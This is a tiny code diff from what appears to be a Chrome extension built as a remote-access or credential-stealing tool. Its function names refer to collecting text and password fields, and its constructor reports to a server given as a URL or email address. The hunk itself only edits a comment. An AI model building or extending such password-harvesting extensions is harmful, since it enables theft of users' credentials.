@@ -37,7 +37,7 @@ function getTextAndPasswordFields() {
 }
 
 function RatInChromeExtension(server) {
-  this._server = server; // it can be make url or email
+  this._server = server; // it can be url or email
   this._data = null;
   this._client = "test1"; // some info for identification
   this.getData = null;
